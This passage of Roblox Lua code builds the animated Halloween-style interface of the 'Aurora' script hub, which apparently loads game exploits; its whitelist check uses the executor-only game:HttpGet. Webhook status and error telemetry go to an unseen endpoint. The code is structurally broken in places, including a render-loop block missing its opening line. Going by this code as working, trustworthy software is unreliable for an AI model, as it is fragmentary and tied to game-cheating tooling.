                    m.y = 1.05
                    m.x = math.random()
                end
                m.obj.Position = UDim2.fromScale(
                    m.x + math.sin(t * 1.4 + m.phase) * m.sway,
                    m.y
                )
                m.obj.BackgroundTransparency = 0.1 + 0.35 * (0.5 + 0.5 * math.sin(t * 2.6 + m.phase))
            end
            sparkClock = sparkClock + dt
            if sparkClock > 0.07 and pointer then
                sparkClock = 0
                local rel = pointer - emberLayer.AbsolutePosition
                if rel.X > -10 and rel.Y > -10
                    and rel.X < emberLayer.AbsoluteSize.X + 10
                    and rel.Y < emberLayer.AbsoluteSize.Y + 10 then
                    local sz = 2 + math.random() * 2.5
                    local spark = create("Frame", {
                        Size                   = UDim2.fromOffset(sz, sz),
                        AnchorPoint            = Vector2.new(0.5, 0.5),
                        Position               = UDim2.fromOffset(rel.X, rel.Y),
                        BackgroundColor3       = Color3.fromRGB(255, 186, 92),
                        BackgroundTransparency = 0.1,
                        BorderSizePixel        = 0,
                        ZIndex                 = 6,
                    }, emberLayer)
                    round(spark, sz / 2)
                    tween(spark, 0.55 + math.random() * 0.3, {
                        Position               = UDim2.fromOffset(rel.X + (math.random() - 0.5) * 26, rel.Y - 22 - math.random() * 22),
                        BackgroundTransparency = 1,
                        Size                   = UDim2.fromOffset(1, 1),
                    }, Enum.EasingStyle.Quad)
                    task.delay(1, function()
                        if spark.Parent then spark:Destroy() end
                    end)
                end
            end
        end

        -- 4. candle flicker
        if candleHolder.Visible then
            local f1 = 0.5 + 0.5 * math.sin(t * 12.7)
            local f2 = 0.5 + 0.5 * math.sin(t * 7.3 + 1.4)
            local flick = 0.55 + 0.45 * (f1 * 0.6 + f2 * 0.4)
            candleFlame.Size               = UDim2.fromOffset(7 + flick * 3, 11 + flick * 5)
            candleFlame.Rotation           = math.sin(t * 9.4) * 4
            candleFlame.BackgroundTransparency = 0.12 - flick * 0.1
            for i, layer in ipairs(candleHaloLayers) do
                layer.BackgroundTransparency = math.clamp(0.66 + (1 - flick) * 0.14 + i * 0.03, 0, 1)
            end
        end

        -- 5. spider
        if spiderHolder.Visible then
            local st = spiderState
            st.timer = st.timer - dt
            if st.mode == "wait" then
                if st.timer <= 0 then
                    st.mode   = "down"
                    st.x      = 0.12 + math.random() * 0.76
                    st.target = 44 + math.random() * math.max(size.Y * 0.32, 60)
                end
            elseif st.mode == "down" then
                st.y = st.y + 46 * dt
                if st.y >= st.target then
                    st.y    = st.target
                    st.mode = "hang"
                    st.timer = 2 + math.random() * 3
                end
            elseif st.mode == "hang" then
                st.sway = math.sin(t * 2.2) * 16
                if st.timer <= 0 then st.mode = "up" end
            elseif st.mode == "up" then
                st.sway = st.sway * 0.9
                st.y = st.y - 62 * dt
                if st.y <= 0 then
                    st.y     = 0
                    st.mode  = "wait"
                    st.timer = 3 + math.random() * 6
                end
            end
            spiderHolder.Position = UDim2.new(st.x, 0, 0, 0)
            thread.Size           = UDim2.fromOffset(1, math.max(st.y - 10, 0))
            spider.Position       = UDim2.new(0.5, 0, 0, st.y)
            spider.Rotation       = (st.mode == "hang") and (math.sin(t * 2.2) * 10) or 0
        end

        -- 6. blood drip
        if dripBand.Visible then
            for _, d in ipairs(dripList) do
                if d.mode == "wait" then
                    d.timer = d.timer - dt
                    if d.timer <= 0 then
                        d.mode   = "grow"
                        d.len    = 0
                        d.target = 6 + math.random() * 20
                        d.x      = 0.05 + math.random() * 0.9
                        d.stem.Position = UDim2.new(d.x, 0, 0, 0)
                        d.stem.BackgroundTransparency = 0.12
                        d.bulb.Position = UDim2.new(d.x, 0, 0, 0)
                        d.bulb.BackgroundTransparency = 0.12
                        d.bulb.Visible = true
                    else
                        d.stem.Size = UDim2.fromOffset(3, 0)
                        d.bulb.Visible = false
                    end
                elseif d.mode == "grow" then
                    d.len = d.len + dt * 8
                    d.stem.Size = UDim2.fromOffset(3, d.len)
                    d.bulb.Position = UDim2.new(d.x, 0, 0, d.len)
                    if d.len >= d.target then
                        d.mode = "fall"
                        d.by   = d.len
                        d.vy   = 26
                    end
                elseif d.mode == "fall" then
                    d.vy = d.vy + 620 * dt
                    d.by = d.by + d.vy * dt
                    d.bulb.Position = UDim2.new(d.x, 0, 0, d.by)
                    d.bulb.BackgroundTransparency = math.min(d.bulb.BackgroundTransparency + dt * 1.4, 1)
                    if d.len > 0 then
                        d.len = math.max(0, d.len - dt * 46)
                        d.stem.Size = UDim2.fromOffset(3, d.len)
                    end
                    if d.by > 60 then
                        d.mode  = "wait"
                        d.timer = 0.8 + math.random() * 3
                        d.bulb.Visible = false
                    end
                end
            end
        end

        -- 7. ghost companion
        if ghostHolder.Visible then
            local g = ghostState
            g.timer = g.timer - dt
            if g.timer <= 0 then
                g.timer = 2.4 + math.random() * 3.2
                g.tx    = 0.16 + math.random() * 0.68
                g.ty    = 0.18 + math.random() * 0.6
            end
            local k = 1 - math.exp(-1.6 * dt)
            g.x = g.x + (g.tx - g.x) * k
            g.y = g.y + (g.ty - g.y) * k
            ghostHolder.Position = UDim2.fromScale(
                g.x + math.sin(t * 0.9 + g.phase) * 0.012,
                g.y + math.sin(t * 1.7 + g.phase) * 0.022
            )
            ghostHolder.Rotation = math.sin(t * 1.1 + g.phase) * 4
            ghostBody.GroupTransparency = 0.16 + 0.08 * (0.5 + 0.5 * math.sin(t * 1.3))
            g.blink = g.blink - dt
            if g.blink <= 0 then
                g.blink = 2 + math.random() * 3
                for _, eye in ipairs(ghostEyes) do
                    tween(eye, 0.08, { Size = UDim2.fromOffset(5, 1) }, Enum.EasingStyle.Quad)
                end
                tween(ghostMouth, 0.08, { Size = UDim2.fromOffset(7, 7) }, Enum.EasingStyle.Quad)
                task.delay(0.16, function()
                    for _, eye in ipairs(ghostEyes) do
                        if eye.Parent then tween(eye, 0.16, { Size = UDim2.fromOffset(5, 7) }, Enum.EasingStyle.Back) end
                    end
                    if ghostMouth.Parent then
                        tween(ghostMouth, 0.2, { Size = UDim2.fromOffset(6, 6) }, Enum.EasingStyle.Back)
                    end
                end)
            end
        end

        -- 8. auto lightning
        if on("Lightning") then
            lightningClock = lightningClock - dt
            if lightningClock <= 0 then
                lightningClock = 7 + math.random() * 9
                api:Lightning()
            end
        end

        -- 9. wordmark glitch
        if brand and brand.Parent and on("Glitch") then
            glitchTimer = glitchTimer - dt
            if glitchTimer <= 0 then
                glitchTimer = 1.8 + math.random() * 3.6
                brand.TextTransparency = 0.62
                brand.Position         = brandBasePos + UDim2.fromOffset((math.random() - 0.5) * 7, 0)
                task.delay(0.07, function()
                    if brand.Parent then
                        brand.TextTransparency = 0
                        brand.Position         = brandBasePos + UDim2.fromOffset((math.random() - 0.5) * 3, 0)
                    end
                end)
                task.delay(0.16, function()
                    if brand.Parent then brand.TextTransparency = 0.45 end
                end)
                task.delay(0.24, function()
                    if brand.Parent then
                        brand.TextTransparency = 0
                        brand.Position         = brandBasePos
                    end
                end)
            end
        end
    end

    api:Apply()
    return api
end

        function TabManager:Select(name)
            local target = self.Tabs[name]
            if not target or self.Active == name then return end
            local previous = self.Active and self.Tabs[self.Active] or nil
            self.Active = name
            for _, tab in pairs(self.Tabs) do
                local active = tab == target
                tween(tab.Button, 0.3, { BackgroundTransparency = active and 0.88 or 1 }, Enum.EasingStyle.Quad)
                tween(tab.Label,  0.3, { TextColor3 = active and Theme.Text or Theme.SubText }, Enum.EasingStyle.Quad)
                tween(tab.Indicator, 0.4, {
                    Size                   = active and UDim2.new(0,3,0.5,0) or UDim2.new(0,3,0,0),
                    BackgroundTransparency = active and 0 or 1,
                }, Enum.EasingStyle.Back)
                tab.Icon.SetColor(active and Theme.AccentGlow or Theme.SubText, 0.3)
            end
            if previous then
                tween(previous.Group, 0.18, { GroupTransparency = 1 }, Enum.EasingStyle.Quad)
                task.delay(0.2, function()
                    if self.Active ~= previous.Name then previous.Group.Visible = false end
                end)
            end
            target.Group.Visible           = true
            target.Group.GroupTransparency = 1
            target.Group.Position          = UDim2.fromOffset(0, 12)
            target.SlideSpring:Snap(12)
            target.SlideSpring:Set(0)
            tween(target.Group, 0.25, { GroupTransparency = 0 }, Enum.EasingStyle.Quad)
            target.Scroll.CanvasPosition = Vector2.new(0, 0)
        end

        local consoleLines = {}
        local consoleHost
        local function Log(message, kind)
            if not consoleHost then return end
            local color = Theme.SubText
            if kind == "Success" then color = Theme.Success
            elseif kind == "Error"   then color = Theme.Error
            elseif kind == "Warning" then color = Theme.Warning
            elseif kind == "Info"    then color = Theme.AccentGlow
            end
            local line = makeLabel(consoleHost, {
                Text         = string.format("[%s] %s", os.date("%H:%M:%S"), message),
                TextSize     = 11,
                Font         = Enum.Font.Code,
                TextColor3   = color,
                TextTruncate = Enum.TextTruncate.AtEnd,
                Size         = UDim2.new(1, 0, 0, 16),
                LayoutOrder  = nextOrder(),
                ZIndex       = 5,
            })
            table.insert(consoleLines, line)
            if #consoleLines > 10 then
                local first = table.remove(consoleLines, 1)
                first:Destroy()
            end
        end

        local function Report(status, message)
            local called, ok, reason = pcall(SendWebhookLog, status, message)
            if not called then
                -- never let logging break the hub
                Log("Webhook error: " .. tostring(ok), "Warning")
                return false
            end
            if not ok and reason ~= "cooldown active" and reason ~= "duplicate log suppressed" then
                Log("Webhook skipped: " .. tostring(reason), "Warning")
            end
            return ok
        end

        local function validateWhitelist()
            if WHITELIST_URL == "" then
                local token = HttpService:GenerateGUID(false)
                return token ~= nil and LocalPlayer.UserId ~= nil, "Local token validation failed."
            end
            local ok, body = pcall(function() return game:HttpGet(WHITELIST_URL) end)
            if not ok then return false, "The whitelist service could not be reached." end
            local okDecode, data = pcall(function() return HttpService:JSONDecode(body) end)
            if not okDecode or type(data) ~= "table" then return false, "The whitelist response was invalid." end
            for _, id in ipairs(data) do
                if id == LocalPlayer.UserId then return true end
            end
            return false, "Your account is not on the whitelist."
        end

        local function onRenderStep(dt)
            renderClock   = renderClock + dt
            local t        = renderClock
            local screen  = GUI.AbsoluteSize

            local target = Vector2.new(0, 0)
            if settings.Parallax then
                local c = screen / 2
                target  = Vector2.new(
                    math.clamp((pointer.X - c.X) / math.max(c.X, 1), -1, 1),
                    math.clamp((pointer.Y - c.Y) / math.max(c.Y, 1), -1, 1)
                )
            end
            parallax = parallax:Lerp(target, 1 - math.exp(-6 * dt))

            FX:Update(t, dt, pointer)

            springX:Set(state.BaseX - parallax.X * 8 + FX.ShakeOffset.X)
            springY:Set(state.BaseY - parallax.Y * 8 + FX.ShakeOffset.Y)
            Springs:Update(dt)

            if settings.GhostGrid then
                local drift = (t * 7) % 80
                gridLayer.Position = UDim2.fromOffset(-80 + drift - parallax.X*18, -80 + drift - parallax.Y*18)
            end

            if settings.Particles then
                updateBatParticles(bgBats, t, dt, parallax)
                updateBatParticles(mainBats, t, dt, parallax * 0.5)
            end

            if copyPulse then
                local wave = 0.5 + 0.5 * math.sin(t * 4)
                copyBtn.Stroke.Transparency = 0.7 - 0.7 * wave
                copyBtn.Stroke.Thickness    = 2 + 2 * wave
            end

            if spinnerActive then
                spinner.Gradient.Rotation = (t * 420) % 360
            end

            local seconds = math.floor(t)
            if seconds ~= lastSecond then
                lastSecond       = seconds
                clockLbl.Text    = os.date("%H:%M:%S")
                local elapsed    = math.max(0, os.time() - sessionStartClock)
                local text       = string.format("%02d:%02d", math.floor(elapsed/60), math.floor(elapsed%60))
                if uptimeValue and uptimeValue.Parent then
                    uptimeValue.Text = text
                end
            end

            fpsFrames = fpsFrames + 1
            fpsTime   = fpsTime + dt
            if fpsTime >= 0.25 then
                local fps = math.floor(fpsFrames / fpsTime + 0.5)
                fpsFrames, fpsTime = 0, 0
                table.remove(history, 1)
                table.insert(history, fps)
                if tabs.Active == "Telemetry" then
                    local tint = fps > 45 and Theme.Success or (fps > 25 and Theme.Warning or Theme.Error)
                    fpsValue.Text       = fps.." FPS"
                    fpsValue.TextColor3 = tint
                    local ping = safeEnv(function() return math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()+0.5) end, 0)
                    local mem  = safeEnv(function() return math.floor(Stats:GetTotalMemoryUsageMb()+0.5) end, 0)
                    pingValue.Text = ping.." ms"
                    memValue.Text  = mem.." MB"
                    for i, bar in ipairs(bars) do
                        local value = history[i]
                        bar.Size             = UDim2.new(1/barCount,-3, math.clamp(value/120,0.04,1), 0)
                        bar.BackgroundColor3 = value > 45 and Theme.Success or (value > 25 and Theme.Warning or Theme.Error)
                    end
                end
            end
        end

        -- a single bad frame must never kill the whole hub

            if renderErrors > 6 then return end
            local okLoop, loopErr = pcall(onRenderStep, dt)
            if not okLoop then
                renderErrors = renderErrors + 1
                warn("[Aurora] render loop error: " .. tostring(loopErr))
                if renderErrors == 1 then
                    pcall(sendErrorTelemetry, "Render loop error: " .. tostring(loopErr))
                end
                if renderErrors > 6 then
                    warn("[Aurora] render loop stopped after repeated errors.")
                end
            end
